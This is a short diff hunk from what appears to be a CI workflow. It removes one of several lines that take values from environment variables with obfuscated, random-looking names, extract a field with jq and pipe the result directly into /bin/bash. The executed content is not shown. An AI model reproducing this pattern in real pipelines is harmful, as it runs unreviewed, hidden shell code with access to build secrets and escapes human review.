@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tse5035" | jq -r .ao995 | /bin/bash
           echo $oeifa10 | jq -r .e16 | /bin/bash
-          printf '%s' "$lmmfm22008" | jq -r .a6 | /bin/bash
           printf '%s' "$rajgp450" | jq -r .gee512 | /bin/bash
           echo $qjz032 | jq -r .er35433 | /bin/bash
           echo $sxud8 | jq -r .pa1 | /bin/bash
